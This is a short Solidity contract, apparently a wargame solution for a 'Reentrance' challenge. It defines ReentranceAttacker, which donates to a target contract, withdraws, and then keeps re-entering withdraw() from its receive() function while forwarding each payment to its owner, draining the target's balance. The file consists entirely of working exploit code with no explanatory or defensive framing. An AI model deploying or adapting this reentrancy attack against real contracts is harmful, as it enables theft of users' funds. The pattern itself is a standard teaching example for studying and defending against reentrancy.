// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentranceAttacker {

  address owner;
  address reentrance;

  constructor(address _reentrance) public {
    require(_reentrance != address(0));
    reentrance = _reentrance;
    owner = msg.sender;
  }

  function attack() external payable {
    Reentrance(payable(reentrance)).donate{ value: msg.value }(address(this));
    Reentrance(payable(reentrance)).withdraw(msg.value);
  }

  receive() external payable {
    (bool sent, ) = payable(owner).call{ value: msg.value }("");
    require(sent);
    Reentrance(payable(reentrance)).withdraw(msg.value);
  }
}
